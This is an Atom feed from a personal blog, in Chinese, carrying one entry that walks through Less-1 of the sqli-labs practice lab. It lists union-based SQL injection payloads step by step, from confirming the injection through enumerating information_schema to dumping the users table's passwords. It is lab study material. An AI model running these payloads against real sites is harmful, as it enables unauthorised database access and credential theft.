<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>FINSENTY54</title>
  
  <subtitle>你看那云聚了又散，散了又聚</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://finsenty54.github.io/"/>
  <updated>2019-02-28T12:28:53.644Z</updated>
  <id>http://finsenty54.github.io/</id>
  
  <author>
    <name>finsenty54</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>sqli-labs</title>
    <link href="http://finsenty54.github.io/2019/02/27/sqli-labs/"/>
    <id>http://finsenty54.github.io/2019/02/27/sqli-labs/</id>
    <published>2019-02-26T17:01:08.000Z</published>
    <updated>2019-02-28T12:28:53.644Z</updated>
    
    <content type="html"><![CDATA[<h3 id="less-1"><a href="#less-1" class="headerlink" title="less 1"></a>less 1</h3><blockquote><p>single 单个的<br>quote 引号<br>变量前面加 <strong>?</strong></p></blockquote><p>在Less-1里的index.php中添加 <code>echo $sql;</code> 可在网页中显示查询代码，<code>echo &quot;&lt;br&gt;&quot;;</code> 表示换行</p><hr><ol><li><ul><li><code>?id=1&#39;  and 1=1 --+</code> 没有报错，返回正确结果</li><li><code>?id=10&#39;</code> 报错 <code>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;&#39;10&#39;&#39; LIMIT 0,1&#39; at line 1</code></li><li><code>?id=1&#39; and a=2 --+</code> 没有正确结果<br>经过这三个步骤说明是字符型注入</li></ul></li><li><p>使用order by来判断有几个字段<br><code>?id=1&#39; order by 4--+</code><br>报错<code>Unknown column &#39;4&#39; in &#39;order clause&#39;</code><br>说明有3个字段</p></li><li><p><code>LIMIT 0,1</code> 表示结果只显示一行<br><code>?id=-1&#39; union select 1,2,3 --+</code> 看哪个字段可以回显<br><a href="https://imgchr.com/i/k7xiTg" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/28/k7xiTg.png" alt="k7xiTg.png"></a></p></li><li><p><code>?id=1&#39; union select 1,concat_ws(&#39;_&#39;,version(),user(),database()),@@basedir --+</code><br>得到版本，用户，当前数据库，数据路径<br><a href="https://imgchr.com/i/k7zDbT" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/28/k7zDbT.png" alt="k7zDbT.png"></a><br><em>concat_ws 带分隔符的链接</em></p></li><li><p><code>?id=-1&#39; union select 1, group_concat(table_name),3 from information_schema.tables where table_schema = database() --+</code><br>得到当前库的表名<br><a href="https://imgchr.com/i/kHSWFg" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/28/kHSWFg.png" alt="kHSWFg.png"></a><br><code>?id=-1&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata) ,3 --+</code><br>查看数据库名信息<br>*group_concat 行转列</p></li><li><p><code>?id=-1 &#39; union select 1, (select group_concat(column_name)  from information_schema.columns where table_name=&quot;users&quot;), 3 --+</code><br>users 表的列名<br><a href="https://imgchr.com/i/kHp8hQ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/28/kHp8hQ.png" alt="kHp8hQ.png"></a></p></li><li><p><code>?id=-1 &#39; union select 1,(select group_concat(password) from users) ,3 --+</code><br>得出账户密码<br><a href="https://imgchr.com/i/kHpan0" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/28/kHpan0.png" alt="kHpan0.png"></a></p></li></ol><hr><h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><hr>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;less-1&quot;&gt;&lt;a href=&quot;#less-1&quot; class=&quot;headerlink&quot; title=&quot;less 1&quot;&gt;&lt;/a&gt;less 1&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;single 单个的&lt;br&gt;quote 引号&lt;br&gt;变量前面加 &lt;strong&gt;?
      
    
    </summary>
    
    
      <category term="sql" scheme="http://finsenty54.github.io/tags/sql/"/>
    
  </entry>
  
</feed>
